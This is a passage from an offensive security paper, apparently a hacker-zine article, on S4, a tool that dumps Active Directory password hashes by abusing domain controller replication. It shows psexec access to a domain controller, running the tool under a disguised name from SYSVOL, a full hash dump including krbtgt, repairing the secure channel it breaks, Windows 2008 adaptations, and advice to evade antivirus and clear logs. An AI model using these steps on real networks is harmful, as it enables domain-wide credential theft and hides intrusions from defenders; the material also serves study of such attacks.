+P: was deleted successfully
+---------------------------------------------------------------------------
+
+                   Checking the state of the replication
+                   +++++++++++++++++++++++++++++++++++++
+
+It's always good to have an idea of how healthy the replication is on this
+Active Directory because we will interfere deeply. I've never tested the
+technique in an environment prone to replication troubles so I would
+recommend you to be careful.
+
+First log into the BDC using psexec (or your own tool). Then use repadmin
+which will most likely be installed on the box (if not even native) as it
+will give you the details of last operations:
+
+------------------------------[ screendump ]-------------------------------
+C:\S4>.\Tools\PsTools\psexec.exe \\DC4 -u FOO\administrator cmd.exe
+
+PsExec v1.94 - Execute processes remotely
+Copyright (C) 2001-2008 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Password: ******  <-- foo123
+
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+C:\WINDOWS\system32>repadmin /showrepl *
+
+repadmin running command /showrepl against server dc3.foo.bar
+
+Default-First-Site-Name\DC3
+DC Options: IS_GC
+Site Options: (none)
+DC object GUID: 265b7dba-578b-47f1-91ca-78b3019e937d
+DC invocationID: 265b7dba-578b-47f1-91ca-78b3019e937d
+
+==== INBOUND NEIGHBORS ======================================
+
+DC=foo,DC=bar
+    Default-First-Site-Name\DC4 via RPC
+        DC object GUID: 5e66dd87-69a1-485e-8e4e-172def165b06
+        Last attempt @ 2012-03-21 00:32:47 was successful.
+
+[...]
+
+repadmin running command /showrepl against server dc4.foo.bar
+
+Default-First-Site-Name\DC4
+DC Options: (none)
+Site Options: (none)
+DC object GUID: 5e66dd87-69a1-485e-8e4e-172def165b06
+DC invocationID: be4bbd07-2a84-4c73-a00c-8260999ea3f8
+
+==== INBOUND NEIGHBORS ======================================
+
+DC=foo,DC=bar
+    Default-First-Site-Name\DC3 via RPC
+        DC object GUID: 265b7dba-578b-47f1-91ca-78b3019e937d
+        Last attempt @ 2012-03-21 00:46:37 was successful.
+
+[...]
+C:\WINDOWS\system32>
+---------------------------------------------------------------------------
+
+This AD is healthy because there is no problem reported. BTW one little
+advice: avoid using your beloved MSF as a psexec-like tool because it has a
+good chance to be detected by an AV.
+
+                           Running S4 on the BDC
+                           +++++++++++++++++++++
+
+At this point, the only remaining thing to do is to run S4.exe!
+
+------------------------------[ screendump ]-------------------------------
+C:\WINDOWS\system32>\\DC4\SYSVOL\randomname.exe
+[!!] 3 arguments are required!
+
+    \\Vboxsvr\vmware\S4.exe -p PDC_NAME -b BDC_NAME -d DOMAIN [-P password]
+
+                        OR
+
+    \\Vboxsvr\vmware\S4.exe -D -d DOMAIN
+
+C:\WINDOWS\system32>\\DC4\SYSVOL\randomname.exe -p DC3 -b DC4 -d foo.bar
+Administrator:500:6F6D84B5C1DDCB7AAAD3B435B51404EE:
+                  23DBA86EAA18933844864F24A54EBFBF:::
+Guest:501:B3CC5A77A68F6477612A53E12DFC183B:
+          B3CC5A77A68F6477612A53E12DFC183B:::
+krbtgt:502:7396CE194FA9157E5993429157021505:
+           3803F74802050CE62B047668F303B453:::
+SUPPORT_388945a0:1001:8FCA67CF5A9FEB7DB06FDACBE2EFDEAB:
+                      5D798B0AB3CCC22FCD7D333D06E2D785:::
+DC3$:1003:C6DD50758AC2B23B9C63DFB8BC64840C:
+          820B5403DF3484530F644090C564E342:::
+DC3$_history_0:1003:C6DD50758AC2B23B9C63DFB8BC64840C:
+                    9CDEE73ADFA23ED3FEC2CC575EF9D0A7:::
+DC4$:1108:8C6AC94AD2F708E2AAD3B435B51404EE:
+          F77ACB17249932BA36990D85D0F7E01A:::
+DC4$_history_0:1108:CA1CDCD62E2662912950352F77B2EC2C:
+                    5E54C47654328C3C7B541A81D6319837:::
+DC4$_history_1:1108:C233128D17B4A8C47838115D84C67E42:
+                    F77ACB17249932BA36990D85D0F7E01A:::
+---------------------------------------------------------------------------
+
+For compatibility purposes, I kept the format used by pwdump-like tools :]
+Just a little test to be sure that the results are not fucked. Fire a
+Python shell and compute the hash of the Administrator:
+
+------------------------------[ screendump ]-------------------------------
+>>> import hashlib,binascii
+>>> hash = hashlib.new('md4', "foo123".encode('utf-16le')).digest()
+>>> print binascii.hexlify(hash).upper()
+23DBA86EAA18933844864F24A54EBFBF
+>>>
+---------------------------------------------------------------------------
+
+And that's exactly the NTLM of the Administrator \o/
+
+                              Fixing the mess
+                              +++++++++++++++
+
+Now be careful with what I'm about to say because it's *very* important.
+Changing a BDC's machine account password using IADsUser::SetPassword()
+breaks somehow the secure channel between the BDC and the PDC. Breaking the
+secure channel means basically breaking the trust between DCs ultimately
+resulting in a DoS (errors in logs, no more synchronization, ...). Oops :]
+
+This can easily be seen by typing the command:
+
+------------------------------[ screendump ]-------------------------------
+C:\WINDOWS\system32>nltest /SC_CHANGE_PWD:foo.bar
+I_NetLogonControl failed: Status = 5 0x5 ERROR_ACCESS_DENIED
+---------------------------------------------------------------------------
+
+The same command would *not* have failed on DC3 (or on DC4 before changing
+the password). Fortunately, using the Administrator's credentials, you can
+use the *very* useful netdom tool [13] to fix this problem:
+
+------------------------------[ screendump ]-------------------------------
+C:\WINDOWS\system32>netdom RESETPWD /Server:DC3 /UserD:Administrator
+/PasswordD:*
+Type the password associated with the domain user:
+
+The machine account password for the local machine has been successfully
+reset.
+
+The command completed successfully.
+
+C:\WINDOWS\system32>netdom RESET DC4
+The secure channel from DC4 to the domain FOO has been reset.  The
+connection is with the machine \\DC3.FOO.BAR.
+
+The command completed successfully.
+---------------------------------------------------------------------------
+
+Just to prove you that the situation is indeed fixed:
+
+------------------------------[ screendump ]-------------------------------
+C:\WINDOWS\system32>nltest /SC_CHANGE_PWD:foo.bar
+nltest /SC_CHANGE_PWD:foo.bar
+Flags: 0
+Connection Status = 0 0x0 NERR_Success
+The command completed successfully
+---------------------------------------------------------------------------
+
+We're safe! Clean the logs and leave the box :]
+
+
+---[ 7 - S4 .VS. Windows 2008 Domain Controllers
+
+
+While the technique implemented in S4 is very effective if the PDC is a
+Windows 2003 server, it totally fails if it's a Windows 2008 (or higher)
+server and this unfortunately holds even if the Domain's functional level
+is "Windows Server 2003".
+
+The first problem that I encountered was that while I was still able to
+have the new machine account's NTLM propagated, the establishment of the
+secure channel always failed, an "access denied" being returned by
+NetrServerAuthenticate2(). Because I suspected some evolution in the
+protocol, I began to look for information on Netlogon, only to discover
+that Microsoft had already published its specification [10]. My bad! If I
+had been more careful I would have saved time as there was no real need to
+reverse nltest.exe :] Reading the specifications, I discovered something
+really interesting that I had failed to notice through the reversing
+process; there are different algorithms to compute the session key.
+
+Long story short, when a client initiates a connection to the server, it
+first provides its capabilities using the NegotiateFlags parameter of
+NetrServerAuthenticate(). In return, the server will set this parameter to
+provide his own capabilities. This is the way that they both agree on the
+algorithm used to compute the session key.
+
+There are basically three types of session keys (see section 3.1.4.3 of
+[10]):
+
+    1/ AES (strong)
+    2/ 'Strong-Key' which is HMAC-MD5 based (weaker)
+    3/ DES (weak)
+
+The third one is implemented in S4's NlMakeSessionKey() and is also the
+oldest. For compatibility purposes, Windows 2003 is still accepting this
+weak way of computing keys. This explains why the authentication process
+was OK. Starting with Windows 2008, security has been enhanced and the
+minimum required by default is now Strong-Key; I implemented it and the
+authentication is now compatible with Windows 2008 :]
+
+<Note>
+There exists a workaround (Hi D.) to keep using a weak DES session key with
+a Windows 2008 server. Google() the key words "NT4Emulator" and
+"AllowNT4Crypto" for more details (also have a look at the GPO).
+</Note>
+
+Unfortunately this was not sufficient as NetrDatabaseSync() was now
+returning a STATUS_NOT_SUPPORTED. Digging in "[MS-NRPC]: Netlogon Remote
+Protocol Specification" I found the following explanation (rev 24):
+
+-----------------------[ MS official documentation ]-----------------------
+If a server does not support a specific Netlogon RPC method, it MUST return
+ERROR_NOT_SUPPORTED or STATUS_NOT SUPPORTED, based on the return type
+---------------------------------------------------------------------------
+
+The revision is important because in revision 22 NetrDatabaseSync() is
+documented whereas it's not anymore in revision 24. It mysteriously
+disappeared... If we consider the previous quote, it seems fair to assume
+that at some point the function was declared deprecated. Unfortunately the
+reason is probably mentioned in revision 23 which seems currently
+unavailable. Who knows, we might some day have the appropriate explanation.
+However "deprecated" doesn't mean "gone" so it *might* be interesting to
+reverse engineer the function ;]
+
+Btw a little trick to help you:
+
+------------------------------[ screendump ]-------------------------------
+C:\Users\Administrator>nltest /dbflag:ffffffff
+SYSTEM\CurrentControlSet\Services\Netlogon\Parameters set to 0xffffffff
+Flags: 0
+Connection Status = 0 0x0 NERR_Success
+The command completed successfully
+
+C:\Users\Administrator>type %WINDIR%\debug\netlogon.log
+[...]
+04/04 22:23:34 [ENCRYPT] NetrLogonComputeServerDigest: 1105: DC10$: Message
+: dbcbaafc aba49ab9 f6bcabb5 62380816   ..............8b
+04/04 22:23:34 [ENCRYPT] NetrLogonComputeServerDigest: 1105: New Password:
+b6b852a3 5ec54dc9 9ea3917e c51d19fa   .R...M.^~.......
+04/04 22:23:34 [ENCRYPT] NetrLogonComputeServerDigest: 1105: New Digest: d4
+67786d a92bd731 7da18262 3d1cdb4f   mxg.1.+.b..}O..=
+04/04 22:23:34 [ENCRYPT] NetrLogonComputeServerDigest: 1105: Old Password:
+b6b852a3 5ec54dc9 9ea3917e c51d19fa   .R...M.^~.......
+04/04 22:23:34 [ENCRYPT] NetrLogonComputeServerDigest: 1105: Old Digest: d4
+67786d a92bd731 7da18262 3d1cdb4f   mxg.1.+.b..}O..=
+[...]
+---------------------------------------------------------------------------
+
+
+---[ 8 - Additional details
+
+
+a) Are there other alternatives to dump the AD's passwords?
+
+Well apart from pwdump-like techniques, there is at least one more:
+ntds.dit [11] file dumping. In a nutshell, this file is a Jet Blue database
+holding (amongst other things) information about the users. When an LDAP
+query is issued, this database is interrogated. Because it's very sensitive
+(passwords are stored inside), it's both encrypted and system locked thus
+it's not trivial to dump its content. I wasn't aware until recently of any
+tool able to deal with it. It seems that things have changed because I've
+heard some rumors. There should be at least two other alternatives, but I
+won't say more. Be smart and find them yourself :]
+
+b) What about real-life filtering & the requirement of 2 DCs??
+
+The first requirement for the attack is the ability to execute arbitrary
+commands on one of the DCs. One is enough as by design all of them are
+communicating with one another without any restrictions (=filtering).
+
+The second requirement is the existence of at least 2 DCs. Apart from tiny
+corporations, there will always be at least 2 DCs (for business continuity
+in case of a disaster or maintenance operation) so it's no big deal either.
+
+
+c) What about Samba 4 .VS. Windows 2008?
+
+Well, have a look at samba-4.0.0alpha18.tgz :]
+
+
+---[ 9 - Last words
+
+
+The original title of the paper was something like:
+         "The art of the laziness: exploiting the Samba 4 project"
+
+What I wanted to highlight is that sometimes with only a few ideas and
+minimal efforts you can come up with new tools & techniques. Read the S4
+source code, test it, improve it and use it wisely. As they all say:
+
+               Happy Hacking! :-]
+
+                                        -- High 5 to my fellows
+
+---[ 10 - Bibliography
+
+
+[01]  http://en.wikipedia.org/wiki/Pwdump
+[02]  http://en.wikipedia.org/wiki/Active_Directory
+[03]  http://wiki.samba.org/index.php/Samba4
+[04]  http://securite.intrinsec.com/2010/09/07/
+      rd-outil-dextraction-de-mots-de-passe-ad/
+[05]  http://msdn.microsoft.com/en-us/library/cc237290%28v=prot.13%29.aspx
+[06]  http://en.wikipedia.org/wiki/Primary_Domain_Controller
+[07]  http://www.microsoft.com/download/en/details.aspx?id=16770
+[08]  http://msdn.microsoft.com/en-us/library/cc237225%28v=prot.13%29.aspx
+[09]  http://msdn.microsoft.com/en-us/library/cc237082%28v=prot.13%29.aspx
+[10]  http://msdn.microsoft.com/en-us/library/cc237008%28v=prot.10%29.aspx
+[11]  http://www.stoyanoff.info/blog/2012/02/11/ad-data-store-part-1/
+[12]  http://en.wikipedia.org/wiki/Flexible_single_master_operation
+[13]  http://technet.microsoft.com/en-us/library/cc772217%28v=ws.10%29.aspx
+[14]  http://technet.microsoft.com/en-us/library/cc776877%28WS.10%29.aspx
+
+
+---[ 11 - c0de: S4
+
+
+---[ EOF
